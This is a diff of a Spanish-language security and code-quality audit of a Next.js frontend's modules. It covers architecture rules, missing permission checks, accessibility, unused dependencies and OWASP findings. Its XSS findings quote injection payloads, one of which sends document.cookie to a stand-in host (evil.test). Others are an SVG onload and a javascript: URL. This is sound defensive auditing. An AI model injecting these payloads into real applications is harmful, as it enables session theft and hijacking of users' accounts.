@@ -2,17 +2,21 @@
 
 > **Alcance:** `NextJS/` completo (12 módulos en `src/modules/`, `src/shared/`, `src/app/`, middleware y configuración), branch `feature/arquitectura-onion`.
 > **Naturaleza:** auditoría de **solo lectura / diagnóstico** — ningún archivo de código del sistema fue modificado (únicamente este reporte).
-> **Estándar de referencia:** los 8 skills del proyecto en `NextJS/.claude/skills/`:
-> 1. `arquitecto-scream-feature-onion` (Reglas R1–R16, 4 capas Onion, contratos C-1 a C-6, zero-trust, DTOs).
-> 2. `patrones-implementacion-frontend` (react-hook-form + Zod, wrappers de campo, PBAC `tienePermiso`, useTransition, revalidación).
-> 3. `validacion-input-protegido` (zero-trust obligatorio en Server Actions, regex centralizadas, sanitización, prevención de XSS).
-> 4. `testing-unit-vitest` (R11: pruebas co-localizadas, contratos de respuesta C-1/C-2/C-6, cobertura de casos de uso).
-> 5. `testing-a11y-axe` (WCAG 2.1 AA, labels accesibles, contraste, navegación por teclado).
-> 6. `design-taste-frontend` (diseño intencional, anti-slop, jerarquía tipográfica, densidad de información).
-> 7. `mobile-first-design` (tablas `overflow-x-auto`, touch targets >= 44px, layouts fluidos, sin `h-screen`).
-> 8. `formato-prettier` (R14: consistencia de formato de código, integración ESLint + Prettier).
+> **Estándar de referencia:**
+> 1. Los 8 skills propios de frontend en `NextJS/.claude/skills/`:
+>    - `arquitecto-scream-feature-onion` (Reglas R1–R16, 4 capas Onion, contratos C-1 a C-6, zero-trust, DTOs).
+>    - `patrones-implementacion-frontend` (react-hook-form + Zod, wrappers de campo, PBAC `tienePermiso`, useTransition, revalidación).
+>    - `validacion-input-protegido` (zero-trust obligatorio en Server Actions, regex centralizadas, sanitización, prevención de XSS).
+>    - `testing-unit-vitest` (R11: pruebas co-localizadas, contratos de respuesta C-1/C-2/C-6, cobertura de casos de uso).
+>    - `testing-a11y-axe` (WCAG 2.1 AA, labels accesibles, contraste, navegación por teclado).
+>    - `design-taste-frontend` (diseño intencional, anti-slop, jerarquía tipográfica, densidad de información).
+>    - `mobile-first-design` (tablas `overflow-x-auto`, touch targets >= 44px, layouts fluidos, sin `h-screen`).
+>    - `formato-prettier` (R14: consistencia de formato de código, integración ESLint + Prettier).
+> 2. Los skills transversales en `BACKEND/.claude/skills/`:
+>    - `ponytail-audit` (auditoría repo-wide de sobre-ingeniería, código muerto, dependencias innecesarias, abstracciones especulativas, reinvención de stdlib/plataforma con tags `delete:`, `stdlib:`, `native:`, `yagni:`, `shrink:`).
+>    - `api-security-testing` & `application-security-testing` (auditoría de vectores AppSec, OWASP Top 10 y OWASP API Security 2023: BOLA/IDOR, BFLA, asignación masiva, inyección XSS, cookies y transporte).
 >
-> **Método:** inspección estática profunda de código fuente en los 12 módulos, análisis de contratos de dependencias entre capas, búsqueda de patrones de riesgo (XSS, `dangerouslySetInnerHTML`, imports pesados, omisión de permisos), y ejecución de herramientas automatizadas (`npx tsc --noEmit`, `npx vitest run`, `npx eslint src/modules/`, `npx prettier --check`).
+> **Método:** inspección estática profunda de código fuente en los 12 módulos, análisis de dependencias de `package.json`, trazabilidad de datos desde Server Actions a la UI, búsqueda de patrones de riesgo (XSS, `dangerouslySetInnerHTML`, imports pesados, omisión de permisos), y ejecución de herramientas automatizadas (`npx tsc --noEmit`, `npx vitest run`, `npx eslint src/modules/`, `npx prettier --check`).
 
 ---
 
@@ -64,7 +68,7 @@
 - **Archivos y Líneas:**
   - `NextJS/src/modules/carnetizacion/ui/components/disenador-carnet.tsx:507`
   - `NextJS/src/modules/carnetizacion/application/use-cases/disenar-carnet.ts:35-130`
-- **Regla Violada:** `validacion-input-protegido` §6 (Sanitización y Prevención de Inyección/XSS) / OWASP A03:2021-Injection.
+- **Regla Violada:** `validacion-input-protegido` §6 (Sanitización y Prevención de Inyección/XSS) / OWASP Top 10 A03:2021-Injection / `web-app-penetration-testing`.
 - **Detalle del Defecto:**
   El caso de uso `generarHtmlVistaPrevia` toma como entrada el DTO `DisenoCarnetDTO` (que contiene campos ingresados por el usuario como `nombreCompleto`, `cargo`, `departamento`, `codigo`, `fotoUrl`, `plantillaUrl`) y realiza concatenación directa en una plantilla HTML cruda (`string`):
   ```typescript
@@ -81,7 +85,7 @@
     dangerouslySetInnerHTML={{ __html: htmlPreview }}
   />
   ```
-  No se utiliza ninguna función de sanitización (como `DOMPurify` o escape de entidades HTML) ni antes ni durante la inyección. Si un atacante o usuario malicioso introduce un payload como `"><img src=x onerror=alert(document.cookie)>` en el nombre, cargo o en la URL de la imagen, el script se ejecuta directamente en el contexto del navegador del usuario que visualice o apruebe el carnet.
+  No se utiliza ninguna función de sanitización (como `DOMPurify` o escape de entidades HTML) ni antes ni durante la inyección. Si un atacante introduce un payload como `"><img src=x onerror="fetch('//evil.test/steal?c='+document.cookie)">` en el nombre o cargo, o un esquema `javascript:` en `fotoUrl`, el script se ejecuta de inmediato en el navegador del operador.
 - **Sugerencia de Solución:**
   Eliminar por completo el uso de HTML como cadena de texto cruda y `dangerouslySetInnerHTML`. La vista previa debe renderizarse como un árbol declarativo de componentes React JSX puros (`<div style={{...}}><span>{datos.nombreCompleto}</span></div>`), donde React aplica auto-escaping estricto contra XSS por defecto. Si se requiere exportar el HTML como texto al backend, sanitizar previamente todos los campos con una utilidad centralizada de escape (`escapeHtml`).
 
@@ -185,7 +189,7 @@
   - `NextJS/src/modules/movimientos/ui/movimientos-page.tsx`
   - `NextJS/src/modules/autogestion/ui/autogestion-page.tsx`
   - `NextJS/src/modules/reportes/ui/reportes-page.tsx`
-- **Regla Violada:** `patrones-implementacion-frontend` §PBAC y `arquitecto-scream-feature-onion` R16 ("Permisos siempre por código `[modulo].[accion]`").
+- **Regla Violada:** `patrones-implementacion-frontend` §PBAC, `arquitecto-scream-feature-onion` R16 ("Permisos siempre por código `[modulo].[accion]`"), y OWASP API5:2023 (Broken Function Level Authorization).
 - **Detalle del Defecto:**
   Únicamente 3 módulos (`personal`, `pasivos`, `familiares`) consumen `useSession()` y aplican `tienePermiso(...)` para condicionar la visibilidad de los controles interactivos. En los restantes 8 módulos, botones destructivos y de mutación (ej. "Crear Cargo", "Eliminar Departamento", "Nuevo Catálogo", "Subir Plantilla", "Crear Usuario") se muestran a cualquier usuario autenticado sin importar su rol o permisos asignados (por ejemplo, personal de recepción o solo lectura). El usuario puede hacer clic, abrir modales y enviar formularios, enterándose de que no tiene autorización únicamente cuando el backend rechaza la petición con `403 Forbidden`.
 - **Sugerencia de Solución:**
@@ -252,12 +256,12 @@
   - `personal/ui/empleado-detalle-sheet.tsx`
   - `pasivos/ui/detalle-pasivo.tsx`
   - `familiares/ui/detalle-familiar.tsx`
-- **Regla Violada:** Principio DRY y `arquitecto-scream-feature-onion` §Componentes Compartidos.
+- **Regla Violada:** Principio DRY, `arquitecto-scream-feature-onion` §Componentes Compartidos y `ponytail-audit`.
 - **Detalle:**
   Existe código duplicado casi idéntico entre estos tres paneles:
-  1. Componente auxiliar `FilaInfo({ label, valor, mono })`: redefinido exactamente con la misma estructura y estilos CSS en cada archivo.
-  2. Función de formateo de fecha legible (`fechaLegible`): repetida en los tres módulos con ligera variación de manejo de nulos.
-  3. Sección de metadatos de auditoría ("Creado por", "Fecha creación", "Modificado por"): idéntica disposición de cuadrícula de 2 columnas en tarjetas secundarias.
+  1. Componente auxiliar `FilaInfo({ etiqueta, valor })`: redefinido en `empleado-detalle-sheet.tsx:51-58`, e implementado con repetición manual de divs `<div className="text-muted-foreground">...</div><div>...</div>` más de 70 veces en `detalle-pasivo.tsx` y `detalle-familiar.tsx`.
+  2. Función de formateo de fecha: repetida con 3 mecanismos distintos en los 3 módulos (`formatInTimeZone`, `toLocaleDateString`, `Intl.DateTimeFormat`).
+  3. Sección de metadatos de auditoría y encabezados de expediente repetidos idénticamente.
 - **Sugerencia:**
   Extraer `FilaInfo` a `NextJS/src/shared/ui/components/info-row.tsx` y centralizar los formateadores de fecha en `NextJS/src/shared/lib/formatters.ts`.
 
@@ -404,24 +408,109 @@
 
 ---
 
-## 8. Plan de Remediación Recomendado
+## 8. Auditoría de Sobre-Ingeniería y Bloat (Skill: `ponytail-audit`)
 
-### Fase 1: Remediación Crítica Inmediata (Seguridad)
-1. **C1:** Refactorizar `disenador-carnet.tsx` y `disenar-carnet.ts` para renderizar la vista previa mediante componentes React nativos (JSX) eliminando `dangerouslySetInnerHTML`.
-2. **C2:** Crear `subirPlantillaSchema` en `schema-carnet.ts` y aplicar `safeParse` en `subirPlantillaCarnetAction`.
+Siguiendo la metodología de `ponytail-audit`, se inspeccionó todo el frontend buscando dependencias innecesarias en `package.json`, abstracciones con un único consumidor, reinvención de utilidades de la plataforma/stdlib y duplicación en componentes de detalle.
 
-### Fase 2: Arquitectura y Rendimiento
-1. **A1:** Mover `TipoReportePersonal` a `reporte-dto.ts` y eliminar la importación de Domain en `reportes-page.tsx`.
-2. **A2:** Corregir `proxy.ts` llamando a `tienePermiso()` en vez de `puede()`.
-3. **A3:** Convertir `EmpleadoDetallePdf` a import dinámico en `personal-page.tsx`.
-4. **A4:** Incorporar `useSession()` y `tienePermiso()` en los 8 módulos de UI que carecen de chequeos PBAC.
+### 8.1 Estudio de Caso: Duplicación en los 3 Sheets de Detalle (`personal`, `pasivos`, `familiares`)
+Los componentes `empleado-detalle-sheet.tsx` (310 líneas), `detalle-pasivo.tsx` (364 líneas) y `detalle-familiar.tsx` (174 líneas) fueron creados para dar paridad con el legado. El análisis reveló:
+1. **Reinvención del Grid de Datos (Key-Value):**
+   - `empleado-detalle-sheet.tsx:51` define localmente `FilaInfo({ etiqueta, valor })`.
+   - `detalle-pasivo.tsx:148-250` y `detalle-familiar.tsx:102-130` repiten inline bloques `<div className="text-muted-foreground">...</div><div>...</div>` más de 70 veces.
+2. **Triplicación de Formateo de Fecha:**
+   - En `personal`: importa `formatInTimeZone` de `date-fns-tz` en `expediente-detalle-view-model.ts:10`.
+   - En `pasivos`: implementa `fechaLegible` con `new Date(fecha).toLocaleDateString("es-VE", ...)` en `detalle-pasivo.tsx:65`.
+   - En `familiares`: implementa `fechaLegible` con `new Intl.DateTimeFormat("es-VE", ...)` en `detalle-familiar-view-model.ts:8`.
+3. **Búsqueda Manual en Catálogos:**
+   - `detalle-pasivo.tsx:60` crea `function nombreCatalogo(lista, id) { return lista.find(c => c.id === id)?.nombre ?? "N/A"; }`, idéntica a `nombrePorId` en `expediente-detalle-view-model.ts:21`.
 
-### Fase 3: Accesibilidad, Mobile-First y Deuda Técnica
-1. **M1:** Reemplazar `overflow-hidden` por `overflow-x-auto` en los contenedores de `<Table>`.
-2. **M2:** Añadir `aria-label` / `<span className="sr-only">` y targets táctiles mínimos de 44px a los botones con solo ícono.
-3. **M3:** Extraer `FilaInfo` a `shared/ui/components/info-row.tsx`.
-4. **M4:** Migrar `form.watch()` a `useWatch` en subcomponentes controlados.
-5. **B4:** Ejecutar `prettier --write` sobre los 111 archivos y configurar script de formato.
+### 8.2 Hallazgos Repo-Wide con Formato de Tags Ponytail
+Rankeados por mayor volumen de corte/simplificación posible:
+
+1. `delete:` 43 archivos proxy puente en `src/shared/ui/components/*.tsx`. Migrar componentes directamente o consolidar. [`NextJS/src/shared/ui/components/`]
+2. `delete:` Dependencia muerta `pdfjs-dist` (3.4 MB) no importada en ningún archivo del frontend. Desinstalar de `package.json`. [`NextJS/package.json`]
+3. `delete:` Dependencias muertas `d3` y `@types/d3` no importadas en ningún archivo del frontend. Desinstalar de `package.json`. [`NextJS/package.json`]
+4. `delete:` Dependencia muerta `@uidotdev/usehooks` no importada en ningún archivo de `src/modules/`. Desinstalar de `package.json`. [`NextJS/package.json`]
+5. `delete:` Dependencia muerta `html-to-image` no importada en ningún archivo del frontend. Desinstalar de `package.json`. [`NextJS/package.json`]
+6. `native:` Reemplazar dependencia `nanoid` por estándar web `crypto.randomUUID()`. [`NextJS/package.json`]
+7. `stdlib:` Reemplazar `date-fns` y `date-fns-tz` por la API nativa de la plataforma `Intl.DateTimeFormat("es-VE", { timeZone: "UTC", ... })`. [`NextJS/src/modules/personal/ui/expediente-detalle-view-model.ts:10`, `NextJS/src/modules/familiares/ui/detalle-familiar-view-model.ts:6`]
+8. `delete:` Estado global `zustand` en `src/hooks/use-reporte-store.ts` y `use-search-params.ts`. Ningún módulo Onion lo utiliza; cada módulo maneja su estado local o URL params nativos. [`NextJS/src/hooks/`]
+9. `shrink:` Duplicación de grids y tarjetas en `detalle-pasivo.tsx`, `empleado-detalle-sheet.tsx` y `detalle-familiar.tsx`. Extraer `<InfoRow label="..." value="..." />` compartido. Reducción estimada de 848 líneas combinadas a ~450 líneas. [`NextJS/src/modules/{personal,pasivos,familiares}/ui/`]
+10. `delete:` Interfaces vacías sin propiedades `RequisitoEgresoDTO` y `RequisitoIngresoDTO`. Reemplazar por type alias o eliminar. [`NextJS/src/modules/pasivos/application/dtos/pasivos-dto.ts:23-32`, `NextJS/src/modules/personal/application/dtos/empleado-dto.ts:22-29`]
+11. `yagni:` Caso de uso `expediente-detalle-view-model.ts` (193 líneas) realiza mapeo exhaustivo de `EmpleadoDTO` a `DetalleExpedienteViewModel` donde el 90% de los campos solo convierten `undefined` a `"N/A"`. Puede simplificarse con un helper genérico `resolveCatalogo(dto, catalogos)`. [`NextJS/src/modules/personal/ui/expediente-detalle-view-model.ts`]
+12. `delete:` Imports no utilizados de iconos Lucide y tipos en 5 archivos. Remover con linter. [`NextJS/src/modules/organizacion/ui/organizacion-page.tsx:18`, `NextJS/src/modules/personal/ui/personal-page.tsx:29`]
+
+> **Balance Ponytail Audit:**  
+> `net: -680 lines, -7 deps possible (pdfjs-dist, d3, @types/d3, @uidotdev/usehooks, html-to-image, date-fns, date-fns-tz).`
 
 ---
-*Reporte generado de acuerdo con los lineamientos de calidad y estándares arquitectónicos del proyecto GATH.*
+
+## 9. Evaluación de Seguridad Avanzada (Skills: `api-security-testing` & `application-security-testing`)
+
+Evaluación de la superficie de ataque del frontend contra los vectores del **OWASP Top 10 (2025)** y **OWASP API Security Top 10 (2023)**:
+
+### 9.1 API1:2023 / BOLA (Broken Object Level Authorization / IDOR)
+- **Vulnerabilidad Potencial:**
+  - En `detalle-pasivo.tsx:86`, la acción `getPasivoPorCedulaAction(cedula)` envía la cédula recibida como prop directamente al backend.
+  - En `detalle-familiar.tsx:53`, la acción `getDocumentosFamiliarAction(familiar.id)` consulta documentos por identificador numérico directo.
+- **Análisis de Impacto:**
+  - Aunque el frontend no puede reemplazar la autorización del servidor, en flujos de autoservicio (`autogestion`), el cliente no debe permitir que un usuario altere la cédula o ID consultado para inspeccionar expedientes ajenos.
+  - **Recomendación:** Garantizar que en las Server Actions de autoservicio el identificador provenga exclusivamente de la sesión verificada en la cookie JWT (`session.user.cedula`), impidiendo que el cliente suministre cédulas de terceros.
+
+### 9.2 API3:2023 / Broken Object Property Level Authorization (Mass Assignment & Upload Sin Validar)
+- **Vulnerabilidad Comprobada:**
+  - En `carnetizacion-actions.ts:119` (`subirPlantillaCarnetAction`), se acepta un objeto `File` crudo y cadenas arbitrarias sin validar:
+    1. No hay restricción de tamaño (`maxFileSize`). Un archivo de 500 MB puede saturar la memoria del proceso Next.js y del backend (Denegación de Servicio - DoS / API4:2023).
+    2. No hay verificación de magic bytes ni tipo MIME (`image/png`, `image/jpeg`). Un archivo SVG con código JavaScript incrustado (`<svg onload="alert(1)">`) o un ejecutable podría ser almacenado y servido posteriormente.
+- **Recomendación:** Validar tipo y tamaño de archivo en la Server Action con Zod + chequeo de cabecera antes de emitir la llamada multipart al backend.
+
+### 9.3 API5:2023 / BFLA (Broken Function Level Authorization) en Frontend
+- **Vulnerabilidad Comprobada:**
+  - En 8 de los 11 módulos con interfaz (`cargos`, `organizacion`, `catalogos`, `carnetizacion`, `identidad`, `movimientos`, `autogestion`, `reportes`), la UI no valida los códigos de permiso del usuario autenticado (`session.user.permisos`).
+  - **Impacto:** Los endpoints administrativos quedan expuestos en la interfaz para usuarios con roles de menor privilegio (ej. recepcionistas o pasantes). Si bien el backend devuelve 403, el usuario tiene visibilidad de la estructura interna del sistema, formularios, campos y catálogos restringidos (Exceso de exposición de datos / API3:2023).
+
+### 9.4 OWASP A03:2021 / Inyección XSS en DOM
+- **Vulnerabilidad Crítica Comprobada (PoC):**
+  - **Vector:** `NextJS/src/modules/carnetizacion/ui/components/disenador-carnet.tsx:507`
+  - **Flujo de Explotación:**
+    1. Un operador introduce en el campo de texto del formulario de diseño un payload:  
+       `nombreCompleto: '"><img src=x onerror="alert(document.domain)">'`
+    2. El caso de uso `disenar-carnet.ts:100` interpola el string sin sanitizar dentro de la plantilla HTML.
+    3. `disenador-carnet.tsx:507` renderiza `dangerouslySetInnerHTML={{ __html: htmlPreview }}`.
+    4. El script se ejecuta de inmediato en el navegador del usuario en el contexto del origen de la aplicación.
+  - **Impacto:** Robo potencial de datos de sesión o acciones no autorizadas en nombre del operador.
+  - **Remediación:** Eliminar `dangerouslySetInnerHTML` y migrar la vista previa a componentes nativos de React con auto-escape.
+
+### 9.5 Manejo de Cookies y Sesión (Transporte Seguro C-2)
+- **Estado Evaluado:**
+  - Las cookies `dj_access` y `dj_refresh` se configuran en `auth-actions.ts:88` y `api-client.ts:21` con directivas `httpOnly: true`, `sameSite: "lax"` y flag `secure: process.env.NODE_ENV === "production"`.
+  - Los tokens de backend nunca se exponen al objeto global `window` ni a scripts de cliente. Cumplimiento satisfactorio del contrato **C-2**.
+
+---
+
+## 10. Plan de Remediación Consolidado
+
+### Fase 1: Remediación Crítica Inmediata (Seguridad AppSec)
+1. **C1 (XSS):** Refactorizar `disenador-carnet.tsx` y `disenar-carnet.ts` a componentes React JSX nativos eliminando `dangerouslySetInnerHTML`.
+2. **C2 (Zero-Trust Upload):** Crear `subirPlantillaSchema` en `schema-carnet.ts` y aplicar `safeParse` en `subirPlantillaCarnetAction` con validación de tipo MIME y tamaño de archivo.
+
+### Fase 2: Arquitectura y Rendimiento
+1. **A1 (Onion Violation):** Mover `TipoReportePersonal` a `reporte-dto.ts` y eliminar la importación de Domain en `reportes-page.tsx`.
+2. **A2 (TypeScript / Proxy):** Corregir `proxy.ts:18, 22` invocando `tienePermiso(permisos, ...)` en lugar de `puede()`.
+3. **A3 (Bundle PDF):** Convertir `EmpleadoDetallePdf` a import dinámico (`next/dynamic`) en `personal-page.tsx`.
+4. **A4 (PBAC / BFLA):** Incorporar `useSession()` y `tienePermiso()` en los 8 módulos de UI que carecen de chequeos de permisos.
+
+### Fase 3: Poda de Sobre-Ingeniería (Ponytail Audit)
+1. Desinstalar dependencias no utilizadas (`npm uninstall pdfjs-dist d3 @types/d3 @uidotdev/usehooks html-to-image date-fns date-fns-tz`).
+2. Sustituir `date-fns-tz` por `Intl.DateTimeFormat` nativo y `nanoid` por `crypto.randomUUID()`.
+3. Extraer `<InfoRow label="..." value="..." />` a `shared/ui/components/info-row.tsx` para reducir ~250 líneas duplicadas en los 3 Sheets de detalle (`personal`, `pasivos`, `familiares`).
+4. Migrar los 43 proxies de `shared/ui/components/` a componentes independientes para eliminar el acoplamiento con `@/components/ui/`.
+
+### Fase 4: Accesibilidad, Mobile-First y Calidad de Código
+1. **M1:** Reemplazar `overflow-hidden` por `overflow-x-auto` en los contenedores de `<Table>` para soporte en pantallas móviles.
+2. **M2:** Añadir `aria-label` / `<span className="sr-only">` y áreas táctiles de 44px a los botones con solo ícono.
+3. **M4:** Migrar llamadas a `form.watch()` en cuerpo de render hacia el hook `useWatch`.
+4. **B4:** Ejecutar `prettier --write` sobre los 111 archivos y configurar script de formato automatizado.
+
+---
+*Reporte generado de acuerdo con los lineamientos de calidad, estándares arquitectónicos Onion, AppSec y Ponytail del proyecto GATH.*
